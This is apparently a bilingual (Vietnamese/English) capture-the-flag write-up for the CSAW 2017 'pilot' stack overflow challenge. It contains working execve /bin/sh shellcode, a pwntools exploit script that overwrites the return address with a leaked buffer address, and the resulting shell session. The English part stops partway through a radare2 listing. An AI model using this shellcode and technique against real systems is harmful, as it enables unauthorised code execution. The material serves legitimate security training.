-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  r2 </span><span style="color:#f92672">-</span><span style="">A pilot                           
-</span><span style=""></span><span style="">[</span><span style="">x</span><span style="">]</span><span style=""> Analyze all flags starting with sym. and entry0 </span><span style="">(</span><span style="">aa</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="">x</span><span style="">]</span><span style=""> Analyze len bytes of instructions </span><span style="color:#66d9ef">for</span><span style=""> references </span><span style="">(</span><span style="">aar</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="">x</span><span style="">]</span><span style=""> Analyze </span><span style="color:#66d9ef">function</span><span style=""> calls </span><span style="">(</span><span style="">aac</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">[</span><span style=""> </span><span style="">]</span><span style=""> </span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style=""> Use </span><span style="color:#f92672">-</span><span style="">AA or aaaa to perform additional experimental analysis.
-</span><span style=""></span><span style="">[</span><span style="">x</span><span style="">]</span><span style=""> Constructing a </span><span style="color:#66d9ef">function</span><span style=""> name </span><span style="color:#66d9ef">for</span><span style=""> fcn.</span><span style="color:#f92672">*</span><span style=""> and sym.func.</span><span style="color:#f92672">*</span><span style=""> functions </span><span style="">(</span><span style="">aan</span><span style="">))</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#ae81ff">0x004008b0</span><span style="">]</span><span style="color:#f92672">&gt;</span><span style=""> afl
-</span><span style=""></span><span style="color:#ae81ff">0x004007c8</span><span style="">    </span><span style="color:#ae81ff">3</span><span style=""> </span><span style="color:#ae81ff">26</span><span style="">           sub.__gmon_start___248_7c8
-</span><span style=""></span><span style="color:#ae81ff">0x00400800</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">32</span><span style="">   sym.imp.setvbuf
-</span><span style=""></span><span style="color:#ae81ff">0x00400810</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSt8ios_base4InitC1Ev_32_810
-</span><span style=""></span><span style="color:#ae81ff">0x00400820</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sym.imp.read
-</span><span style=""></span><span style="color:#ae81ff">0x00400830</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sym.imp.__libc_start_main
-</span><span style=""></span><span style="color:#ae81ff">0x00400840</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sym.imp.__cxa_atexit
-</span><span style=""></span><span style="color:#ae81ff">0x00400850</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSt8ios_base4InitD1Ev_64_850
-</span><span style=""></span><span style="color:#ae81ff">0x00400860</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860
-</span><span style=""></span><span style="color:#ae81ff">0x00400870</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSolsEPKv_80_870
-</span><span style=""></span><span style="color:#ae81ff">0x00400880</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSolsEPFRSoS_E_88_880
-</span><span style=""></span><span style="color:#ae81ff">0x00400890</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890
-</span><span style=""></span><span style="color:#ae81ff">0x004008a0</span><span style="">    </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">           sub.__gmon_start___248_8a0
-</span><span style=""></span><span style="color:#ae81ff">0x004008b0</span><span style="">    </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="color:#ae81ff">41</span><span style="">           entry0
-</span><span style=""></span><span style="color:#ae81ff">0x004008e0</span><span style="">    </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">50</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">41</span><span style="">   fcn.004008e0
-</span><span style=""></span><span style="color:#ae81ff">0x004009a6</span><span style="">    </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">400</span><span style="">          main
-</span><span style=""></span><span style="color:#ae81ff">0x00400b36</span><span style="">    </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">62</span><span style="">           sub.std</span><span style="color:#f92672">::</span><span style="">ios_base</span><span style="color:#f92672">::</span><span style="">Init.Init___b36
-</span><span style=""></span><span style="">[</span><span style="color:#ae81ff">0x004008b0</span><span style="">]</span><span style="color:#f92672">&gt;</span><span style=""> </span></code></pre>
-</div>
-<p>Nhìn có vẻ rất ghê vì binary đã bị stripped. Trong một nỗ lực giảm bớt độ khó của việc debug, mình tìm thấy tool này: <a href="https://github.com/danigargu/syms2elf">syms2elf</a>. Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Sau khi rename vài hàm quan trọng như main, mình export binary ra bằng dòng lệnh <code>$syms2elf pilot_unstripped</code>. Giờ thì mình đã có thể mở binary lên và debug như binary chưa bị stripped một cách thoải mái.</p>
-
-<p>Đặt breakpoint tại vị trí gọi hàm read trong main ở <code>0x00400ae0</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">pwndbg</span><span style="color:#f92672">&gt;</span><span style=""> r
-</span><span style="">Starting program</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#f92672">/</span><span style="">root</span><span style="color:#f92672">/</span><span style="">workspace</span><span style="color:#f92672">/</span><span style="">ctfs</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2017</span><span style="color:#f92672">/</span><span style="">csaw</span><span style="color:#f92672">/</span><span style="">pwn</span><span style="color:#f92672">/</span><span style="">pilot</span><span style="color:#f92672">/</span><span style="">pilot_unstripped 
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Welcome DropShip Pilot...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I am your assitant A.I....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I will be guiding you through the tutorial....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">As a first step</span><span style="">,</span><span style=""> lets learn how to land at the designated location....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines </span><span style="color:#f92672">&amp;</span><span style=""> Medics...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Good Luck Pilot</span><span style="color:#f92672">!</span><span style="color:#ae81ff">.</span><span style="color:#66d9ef">...</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Location</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Command</span><span style="color:#f92672">:</span><span style="">
-</span><span style="">Breakpoint </span><span style="color:#ae81ff">1</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">0x0000000000400ae0</span><span style=""> </span><span style="color:#66d9ef">in</span><span style=""> main </span><span style="">()</span><span style="">
-</span><span style="">LEGEND</span><span style="color:#f92672">:</span><span style=""> STACK </span><span style="color:#f92672">|</span><span style=""> HEAP </span><span style="color:#f92672">|</span><span style=""> CODE </span><span style="color:#f92672">|</span><span style=""> DATA </span><span style="color:#f92672">|</span><span style=""> RWX </span><span style="color:#f92672">|</span><span style=""> RODATA
-</span><span style=""></span><span style="">[</span><span style="">──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────</span><span style="">]</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RAX  </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""> RBX  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RCX  </span><span style="color:#ae81ff">0x7f1788dd3720</span><span style=""> </span><span style="">(</span><span style="">__write_nocancel</span><span style="color:#ae81ff">+7</span><span style="">)</span><span style=""> ◂— cmp    rax</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">-0</span><span style="">xfff
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RDX  </span><span style="color:#ae81ff">0x40</span><span style="">
-</span><span style=""> RDI  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RSI  </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R8   </span><span style="color:#ae81ff">0x7f1789091700</span><span style=""> </span><span style="">(</span><span style="">proc_file_chain_lock</span><span style="">)</span><span style=""> ◂— </span><span style="color:#ae81ff">0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R9   </span><span style="color:#ae81ff">0x7f1789090600</span><span style=""> </span><span style="">(</span><span style="">_IO_2_1_stdout_</span><span style="">)</span><span style=""> ◂— xchg   dword ptr </span><span style="">[</span><span style="">rax</span><span style="">],</span><span style=""> ebp </span><span style="color:#f92672">/*</span><span style=""> </span><span style="color:#ae81ff">0xfbad2887</span><span style=""> </span><span style="color:#f92672">*/</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R10  </span><span style="color:#ae81ff">0x60d</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R11  </span><span style="color:#ae81ff">0x246</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R12  </span><span style="color:#ae81ff">0x4008b0</span><span style=""> </span><span style="">(</span><span style="">entry0</span><span style="">)</span><span style=""> ◂— xor    ebp</span><span style="">,</span><span style=""> ebp
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R13  </span><span style="color:#ae81ff">0x7fffffffe1a0</span><span style=""> ◂— </span><span style="color:#ae81ff">0x1</span><span style="">
-</span><span style=""> R14  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""> R15  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RBP  </span><span style="color:#ae81ff">0x7fffffffe0c0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RSP  </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RIP  </span><span style="color:#ae81ff">0x400ae0</span><span style=""> </span><span style="">(</span><span style="">main</span><span style="color:#ae81ff">+314</span><span style="">)</span><span style=""> ◂— call   </span><span style="color:#ae81ff">0x400820</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="">────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────</span><span style="">]</span><span style="">
-</span><span style=""> ► </span><span style="color:#ae81ff">0x400ae0</span><span style=""> </span><span style="color:#f92672">&lt;</span><span style="">main</span><span style="color:#ae81ff">+314</span><span style="color:#f92672">&gt;</span><span style="">    call   read</span><span style="color:#f92672">@</span><span style="">plt                      </span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x400820</span><span style="color:#f92672">&gt;</span><span style="">
-</span><span style="">        fd</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style="">        buf</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style="">        nbytes</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x40</span></code></pre>
-</div>
-<p>Như vậy ta thấy ngay địa chỉ của buffer khi đọc vào đã được in ra. Vậy thì exploit quá đơn giản rồi, chỉ cần đặt shellcode lên buffẻr và ghi đè return address bằng địa chỉ buffer thôi. Shellcode của mình có chỉnh sửa một chút ở instruction đầu tiên để nới rộng stack dành cho shellcode.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">   </span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">83</span><span style=""> ec </span><span style="color:#ae81ff">48</span><span style="">             sub    rsp</span><span style="">,</span><span style="color:#ae81ff">0x48</span><span style="">
-</span><span style="">   </span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">31</span><span style=""> d2                xor    rdx</span><span style="">,</span><span style="">rdx
-</span><span style="">   </span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> bb ff </span><span style="color:#ae81ff">2</span><span style="">f </span><span style="color:#ae81ff">62</span><span style=""> </span><span style="color:#ae81ff">69</span><span style=""> </span><span style="color:#ae81ff">6</span><span style="">e    movabs rbx</span><span style="">,</span><span style="color:#ae81ff">0x68732f6e69622fff</span><span style="">
-</span><span style="">   e</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">2</span><span style="">f </span><span style="color:#ae81ff">73</span><span style=""> </span><span style="color:#ae81ff">68</span><span style=""> 
-</span><span style="">  </span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> c1 eb </span><span style="color:#ae81ff">08</span><span style="">             shr    rbx</span><span style="">,</span><span style="color:#ae81ff">0x8</span><span style="">
-</span><span style="">  </span><span style="color:#ae81ff">15</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">53</span><span style="">                      push   rbx
-</span><span style="">  </span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">89</span><span style=""> e7                mov    rdi</span><span style="">,</span><span style="">rsp
-</span><span style="">  </span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">31</span><span style=""> c0                xor    rax</span><span style="">,</span><span style="">rax
-</span><span style="">  </span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">c</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">50</span><span style="">                      push   rax
-</span><span style="">  </span><span style="color:#ae81ff">1</span><span style="">d</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">57</span><span style="">                      push   rdi
-</span><span style="">  </span><span style="color:#ae81ff">1</span><span style="">e</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">89</span><span style=""> e6                mov    rsi</span><span style="">,</span><span style="">rsp
-</span><span style="">  </span><span style="color:#ae81ff">21</span><span style="color:#f92672">:</span><span style="">   b0 </span><span style="color:#ae81ff">3</span><span style="">b                   mov    al</span><span style="">,</span><span style="color:#ae81ff">0x3b</span><span style="">
-</span><span style="">  </span><span style="color:#ae81ff">23</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">0</span><span style="">f </span><span style="color:#ae81ff">05</span><span style="">                   syscall</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span><span style=""> </span><span style="">pwn</span><span style=""> </span><span style="color:#f92672">import</span><span style=""> </span><span style="color:#f92672">*</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">context</span><span style="color:#f92672">.</span><span style="">arch</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;amd64&#39;</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">s</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">remote</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;pwn.chal.csaw.io&#39;</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">8464</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">raw_input</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;Exploit?&#39;</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">shellcode</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05</span><span style="color:#e6db74">&#34;</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">recvuntil</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;[*]Location:&#39;</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">leak_buffer</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">s</span><span style="color:#f92672">.</span><span style="">recvuntil</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="">)</span><span style="color:#f92672">.</span><span style="">strip</span><span style="">()</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">print</span><span style=""> </span><span style="">leak_buffer</span><span style="">
-</span><span style=""></span><span style="">leak_buffer</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">int</span><span style="">(</span><span style="">leak_buffer</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">recvuntil</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;[*]Command:&#39;</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">print</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;Shellcode is at:&#39;</span><span style="">,</span><span style=""> </span><span style="">hex</span><span style="">(</span><span style="">leak_buffer</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">shellcode</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="">(</span><span style="color:#ae81ff">40</span><span style=""> </span><span style="color:#f92672">-</span><span style=""> </span><span style="">len</span><span style="">(</span><span style="">shellcode</span><span style="">))</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="">leak_buffer</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">sendline</span><span style="">(</span><span style="">payload</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">interactive</span><span style="">()</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">close</span><span style="">()</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  python exploit.py 
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">+</span><span style="">]</span><span style=""> Opening connection to pwn.chal.csaw.io on port </span><span style="color:#ae81ff">8464</span><span style="color:#f92672">:</span><span style=""> Done
-</span><span style="">Exploit</span><span style="color:#f92672">?</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">0x7ffe3cf25d80</span><span style="">
-</span><span style="">Shellcode is at</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x7ffe3cf25d80</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style=""> Switching to interactive </span><span style="color:#66d9ef">mode</span><span style="">
-</span><span style=""></span><span style="color:#f92672">$</span><span style=""> id
-</span><span style="">uid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="">(</span><span style="">pilot</span><span style="">)</span><span style=""> gid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="">(</span><span style="">pilot</span><span style="">)</span><span style=""> groups</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="">(</span><span style="">pilot</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="color:#f92672">$</span><span style=""> whoami
-</span><span style="">pilot
-</span><span style=""></span><span style="color:#f92672">$</span><span style=""> cat flag
-</span><span style="">flag</span><span style="">{</span><span style="color:#ae81ff">1</span><span style="">nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys</span><span style="">}</span><span style="">
-</span><span style=""></span><span style="color:#f92672">$</span><span style="">  </span></code></pre>
-</div>
-<p><a name="english-pilot"></a></p>
-
-<h5 id="english">English</h5>
-
-<p>This is a basic stack overflow challenge. Let&rsquo;s check out the file info.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  file pilot
-</span><span style="">pilot</span><span style="color:#f92672">:</span><span style=""> ELF </span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span><span style="">bit LSB executable</span><span style="">,</span><span style=""> x86</span><span style="color:#ae81ff">-64</span><span style="">,</span><span style=""> version </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="">(</span><span style="">SYSV</span><span style="">),</span><span style=""> dynamically linked</span><span style="">,</span><span style=""> interpreter </span><span style="color:#f92672">/</span><span style="">lib64</span><span style="color:#f92672">/</span><span style="">ld</span><span style="color:#f92672">-</span><span style="">linux</span><span style="color:#f92672">-</span><span style="">x86</span><span style="color:#ae81ff">-64.</span><span style="">so.2</span><span style="">,</span><span style=""> </span><span style="color:#66d9ef">for</span><span style=""> GNU</span><span style="color:#f92672">/</span><span style="">Linux </span><span style="color:#ae81ff">2.6.32</span><span style="">,</span><span style=""> BuildID</span><span style="">[</span><span style="">sha1</span><span style="">]</span><span style="color:#f92672">=</span><span style="color:#ae81ff">6</span><span style="">ed26a43b94fd3ff1dd15964e4106df72c01dc6c</span><span style="">,</span><span style=""> stripped</span></code></pre>
-</div>
-<p>The information shows that this is a stripped 64-bit binary. A stripped binary is harder to debug. Fortunately, there is a tool that makes debugging stripped binaries slightly easier.</p>
-
-<p>Let&rsquo;s check security settings on this binary using checksec.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  checksec pilot 
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style=""> </span><span style="color:#e6db74">&#39;/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot&#39;</span><span style="">
-</span><span style="">    Arch</span><span style="color:#f92672">:</span><span style="">     amd64</span><span style="color:#ae81ff">-64</span><span style="color:#f92672">-</span><span style="">little
-</span><span style="">    RELRO</span><span style="color:#f92672">:</span><span style="">    Partial RELRO
-</span><span style="">    Stack</span><span style="color:#f92672">:</span><span style="">    No canary found
-</span><span style="">    NX</span><span style="color:#f92672">:</span><span style="">       NX disabled
-</span><span style="">    PIE</span><span style="color:#f92672">:</span><span style="">      No PIE </span><span style="">(</span><span style="color:#ae81ff">0x400000</span><span style="">)</span><span style="">
-</span><span style="">    RWX</span><span style="color:#f92672">:</span><span style="">      Has RWX segments</span></code></pre>
-</div>
-<p>Almost no protection! Let&rsquo;s run the binary.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  </span><span style="color:#ae81ff">.</span><span style="color:#f92672">/</span><span style="">pilot
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Welcome DropShip Pilot...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I am your assitant A.I....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I will be guiding you through the tutorial....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">As a first step</span><span style="">,</span><span style=""> lets learn how to land at the designated location....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines </span><span style="color:#f92672">&amp;</span><span style=""> Medics...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Good Luck Pilot</span><span style="color:#f92672">!</span><span style="color:#ae81ff">.</span><span style="color:#66d9ef">...</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Location</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x7fff0ef02250</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Command</span><span style="color:#f92672">:</span></code></pre>
-</div>
-<p>The location in the output seems a lot like an address in the program, probably the address of the buffer. Let&rsquo;s open it in radare2 to double check.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜  r2 </span><span style="color:#f92672">-</span><span style="">A pilot                           
-</span><span style=""></span><span style="">[</span><span style="color:#ae81ff">0x004008b0</span><span style="">]</span><span style="color:#f92672">&gt;</span><span style=""> afl
-</span><span style=""></span><span style="color:#ae81ff">0x004007c8</span><span style="">    </span><span style="color:#ae81ff">3</span><span style=""> </span><span style="color:#ae81ff">26</span><span style="">           sub.__gmon_start___248_7c8
-</span><span style=""></span><span style="color:#ae81ff">0x00400800</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">32</span><span style="">   sym.imp.setvbuf
-</span><span style=""></span><span style="color:#ae81ff">0x00400810</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSt8ios_base4InitC1Ev_32_810
-</span><span style=""></span><span style="color:#ae81ff">0x00400820</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sym.imp.read
